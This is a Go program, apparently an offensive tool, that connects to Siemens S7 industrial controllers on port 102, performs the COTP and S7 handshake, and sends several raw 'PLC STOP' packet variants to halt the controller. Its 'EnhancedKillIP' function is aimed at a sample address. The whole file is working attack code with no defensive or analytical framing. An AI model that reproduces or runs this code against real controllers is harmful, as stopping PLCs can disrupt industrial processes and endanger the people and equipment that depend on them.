package main

import (
	"fmt"
	"net"
	"time"
)

// Enhanced S7 STOP implementation with multiple command variants
type S7Command struct {
	Name        string
	Command     []byte
	Description string
}

var stopCommands = []S7Command{
	{
		Name:        "Standard STOP",
		Command:     []byte("\x03\x00\x00\x21\x02\xf0\x80\x32\x01\x00\x00\x06\x00\x00\x10\x00\x00\x29\x00\x00\x00\x00\x00\x09\x50\x5f\x50\x52\x4f\x47\x52\x41\x4d"),
		Description: "Original command with P_PROGRAM",
	},
	{
		Name:        "Minimal STOP",
		Command:     []byte("\x03\x00\x00\x19\x02\xf0\x80\x32\x01\x00\x00\x00\x00\x00\x08\x00\x00\x00\x00\x00\x29\x00\x00\x00\x00\x00"),
		Description: "Minimal STOP without parameters",
	},
	{
		Name:        "S7-300 STOP",
		Command:     []byte("\x03\x00\x00\x1d\x02\xf0\x80\x32\x01\x00\x00\x00\x00\x00\x0c\x00\x00\x00\x00\x00\x29\x00\x00\x00\x00\x00\x05\x50\x52\x4f\x47"),
		Description: "S7-300/400 variant with PROG",
	},
}

// Connection setup commands
var setupCommands = []S7Command{
	{
		Name:        "COTP Connect",
		Command:     []byte("\x03\x00\x00\x16\x11\xe0\x00\x00\x00\x01\x00\xc0\x01\x0a\xc1\x02\x01\x02\xc2\x02\x01\x00"),
		Description: "ISO-COTP Connection Request",
	},
	{
		Name:        "S7 Setup",
		Command:     []byte("\x03\x00\x00\x19\x02\xf0\x80\x32\x01\x00\x00\x04\x00\x00\x08\x00\x00\xf0\x00\x00\x01\x00\x01\x01\xe0"),
		Description: "S7 Communication Setup",
	},
}

// Try to establish S7 connection with setup commands
func establishS7Connection(ip string) (*net.Conn, error) {
	conn, err := net.DialTimeout("tcp", ip+":102", 2*time.Second)
	if err != nil {
		return nil, fmt.Errorf("failed to connect: %v", err)
	}

	// Try COTP connection
	fmt.Printf("  -> Sending COTP Connect...\n")
	_, err = conn.Write(setupCommands[0].Command)
	if err != nil {
		conn.Close()
		return nil, fmt.Errorf("failed to send COTP: %v", err)
	}

	// Read response
	response := make([]byte, 1024)
	conn.SetReadDeadline(time.Now().Add(2 * time.Second))
	n, err := conn.Read(response)
	if err != nil {
		conn.Close()
		return nil, fmt.Errorf("no COTP response: %v", err)
	}

	// Check for positive COTP response (0xD0 = CC Connect Confirm)
	if n > 5 && response[5] == 0xD0 {
		fmt.Printf("  -> COTP connection established\n")

		// Send S7 setup
		fmt.Printf("  -> Sending S7 Setup...\n")
		_, err = conn.Write(setupCommands[1].Command)
		if err != nil {
			conn.Close()
			return nil, fmt.Errorf("failed to send S7 setup: %v", err)
		}

		// Read S7 response
		n, err = conn.Read(response)
		if err == nil && n > 0 {
			fmt.Printf("  -> S7 communication established\n")
			return &conn, nil
		}
	}

	// If setup failed, return raw connection anyway
	return &conn, nil
}

// Enhanced KillIP function that tries multiple STOP commands
func EnhancedKillIP(ip string) bool {
	fmt.Printf("\n[*] Attempting enhanced S7 STOP for %s\n", ip)

	// First, try with proper connection setup
	conn, err := establishS7Connection(ip)
	if err != nil {
		fmt.Printf("[-] Connection setup failed: %v\n", err)
		// Try raw connection
		rawConn, err := net.DialTimeout("tcp", ip+":102", 2*time.Second)
		if err != nil {
			fmt.Printf("[-] Failed to connect to %s: %v\n", ip, err)
			return false
		}
		conn = &rawConn
	}
	defer (*conn).Close()

	// Try each STOP command variant
	success := false
	for _, cmd := range stopCommands {
		fmt.Printf("  -> Trying %s (%s)...\n", cmd.Name, cmd.Description)

		_, err := (*conn).Write(cmd.Command)
		if err != nil {
			fmt.Printf("     Failed to send: %v\n", err)
			continue
		}

		// Check for response
		response := make([]byte, 256)
		(*conn).SetReadDeadline(time.Now().Add(1 * time.Second))
		n, err := (*conn).Read(response)

		if err == nil && n > 0 {
			// Check for positive response
			if n > 17 && response[17] == 0x29 {
				fmt.Printf("     SUCCESS: PLC acknowledged STOP command\n")
				success = true
				break
			} else if n > 8 && response[8] == 0x03 {
				// Error response
				fmt.Printf("     PLC returned error (possibly protected)\n")
			} else {
				fmt.Printf("     Received response (%d bytes)\n", n)
			}
		} else {
			fmt.Printf("     No response (command may have worked)\n")
		}

		// Small delay between attempts
		time.Sleep(100 * time.Millisecond)
	}

	return success
}

// Test function to demonstrate enhanced STOP
func TestEnhancedStop() {
	fmt.Println("=== Enhanced S7 STOP Test ===")

	// Test with a specific IP
	testIP := "192.168.1.50"

	// Check if port 102 is open first
	conn, err := net.DialTimeout("tcp", testIP+":102", 1*time.Second)
	if err != nil {
		fmt.Printf("[-] %s is not reachable on port 102\n", testIP)
		return
	}
	conn.Close()

	// Try enhanced STOP
	if EnhancedKillIP(testIP) {
		fmt.Printf("\n[+] Successfully sent STOP command to %s\n", testIP)
	} else {
		fmt.Printf("\n[-] Failed to stop PLC at %s\n", testIP)
	}
}

func main() {
	TestEnhancedStop()
}
